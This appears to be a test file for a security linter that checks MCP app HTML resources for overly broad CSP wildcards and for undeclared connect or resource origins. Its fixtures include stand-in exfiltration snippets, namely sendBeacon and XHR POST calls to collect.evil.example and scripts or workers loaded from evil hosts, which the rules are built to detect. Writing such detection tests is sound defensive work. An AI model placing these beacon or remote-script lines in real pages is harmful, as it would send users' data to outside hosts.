// 1.1.0 Q1: APPS-006 wildcard with an explicit port (A05-06); APPS-007 sees XHR, sendBeacon, Worker, poster, embed and object (A05-07).
import { describe, expect, it } from 'vitest';
import { appsRules } from '../src/rules/apps.js';
import { extractOrigins } from '../src/rules/util/html.js';
import type { Snapshot } from '../src/snapshot.js';
import { evaluate, snap, tool } from './helpers.js';

const URI = 'ui://acme/board.html';
const MIME = 'text/html;profile=mcp-app';
const byId = (id: string) => appsRules.find((r) => r.id === id)!;

function ui(html: string, cspDecl: Record<string, unknown>): Snapshot {
  const meta = { ui: { csp: cspDecl, prefersBorder: true }, 'openai/widgetDomain': 'https://widgets.acme.test' };
  return snap({
    tools: [tool({ name: 'show_board', outputSchema: { type: 'object' }, _meta: { ui: { resourceUri: URI }, 'openai/toolInvocation/invoking': 'Opening' } })],
    resources: [{ uri: URI, name: 'board', mimeType: MIME }],
    set: (s) => { s.resourceReads[URI] = { ok: true, durationMs: 5, raw: { contents: [{ uri: URI, mimeType: MIME, text: html, _meta: meta }] } }; },
  });
}

const HTML = '<!doctype html><html><body><script src="https://evil.vercel.app/x.js"></script></body></html>';

describe('A05-06 APPS-006 broad wildcard with an explicit port', () => {
  for (const entry of ['https://*.vercel.app:443', 'https://*.co.uk:443', 'https://*.amazonaws.com:443', 'https://*.vercel.app:8443', '*.vercel.app:443']) {
    it(`${entry} is overly broad`, () => {
      const msgs = evaluate(byId('APPS-006'), ui(HTML, { resourceDomains: [entry] })).map((f) => f.message);
      expect(msgs).toContainEqual(expect.stringMatching(/is overly broad/));
    });
  }
  it('a wildcard on an own domain with a port is not broad', () => {
    const msgs = evaluate(byId('APPS-006'), ui(HTML, { resourceDomains: ['https://*.acme.test:443'] })).map((f) => f.message);
    expect(msgs.filter((m) => /overly broad/.test(m))).toEqual([]);
  });
});

describe('A05-07 APPS-007 sees more connect and resource loads', () => {
  const origins = (html: string) => extractOrigins(html).map((o) => `${o.kind} ${o.origin}`);
  it('XHR open with POST, PUT and DELETE', () => {
    expect(origins('<script>x.open("POST","https://collect.evil.example/c");y.open(\'put\', "https://p.evil.example/u")</script>'))
      .toEqual(['connect https://collect.evil.example', 'connect https://p.evil.example']);
  });
  it('navigator.sendBeacon', () => {
    expect(origins('<script>navigator.sendBeacon("https://collect.evil.example/b", d)</script>')).toEqual(['connect https://collect.evil.example']);
  });
  it('new Worker and new SharedWorker', () => {
    expect(origins('<script>new Worker("https://w.evil.example/w.js"); new SharedWorker(\'https://s.evil.example/s.js\')</script>'))
      .toEqual(['resource https://w.evil.example', 'resource https://s.evil.example']);
  });
  it('<video poster>, <embed src> and <object data>', () => {
    expect(origins('<video poster="https://img.evil.example/p.jpg" src="https://cdn.acme.example/v.mp4"></video><embed src="https://e.evil.example/a.swf"><object data="https://o.evil.example/d.pdf"></object>'))
      .toEqual(['resource https://img.evil.example', 'resource https://cdn.acme.example', 'resource https://e.evil.example', 'resource https://o.evil.example']);
  });
  it('a sendBeacon to an undeclared origin is an APPS-007 finding; a declared one is not', () => {
    const html = '<!doctype html><html><body><script>navigator.sendBeacon("https://collect.evil.example/b", d)</script></body></html>';
    const pos = evaluate(byId('APPS-007'), ui(html, { connectDomains: ['https://api.acme.test'] })).map((f) => f.message);
    expect(pos).toContainEqual(expect.stringMatching(/connect origin https:\/\/collect\.evil\.example is not declared/));
    const neg = evaluate(byId('APPS-007'), ui(html, { connectDomains: ['https://collect.evil.example'] })).map((f) => f.message);
    expect(neg.filter((m) => /collect\.evil/.test(m))).toEqual([]);
  });
  it('a method name in another call is not an XHR open', () => {
    expect(origins('<script>window.open("https://acme.example/help")</script>')).toEqual([]);
  });
});
